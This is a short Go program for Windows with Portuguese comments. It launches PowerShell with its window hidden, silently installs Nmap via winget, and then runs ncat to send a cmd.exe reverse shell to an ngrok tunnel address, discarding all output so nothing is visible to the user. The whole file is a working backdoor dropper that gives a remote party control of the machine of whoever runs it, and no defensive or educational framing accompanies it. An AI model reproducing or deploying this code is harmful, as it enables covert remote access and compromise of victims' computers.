package main

import (
	"log"
	"os/exec"

	"golang.org/x/sys/windows"
)

func main() {
	// Configura o comando para instalar o Nmap e executar o Netcat
	cmd := exec.Command("powershell.exe", "-Command", "winget install Insecure.Nmap; ncat -e cmd 0.tcp.sa.ngrok.io 19109")

	// Configura o processo para rodar em modo completamente oculto
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow:    true,                          // Oculta a janela do CMD
		CreationFlags: windows.CREATE_NO_WINDOW,     // Impede a criação de janelas
	}

	// Redireciona a saída para /dev/null (ou equivalente no Windows)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	// Executa o comando
	err := cmd.Start()
	if err != nil {
		log.Fatalf("Erro ao iniciar o comando: %v", err)
	}

	// Não bloqueia o processo e continua a execução
	log.Println("Comando de instalação e conexão iniciado com sucesso.")
}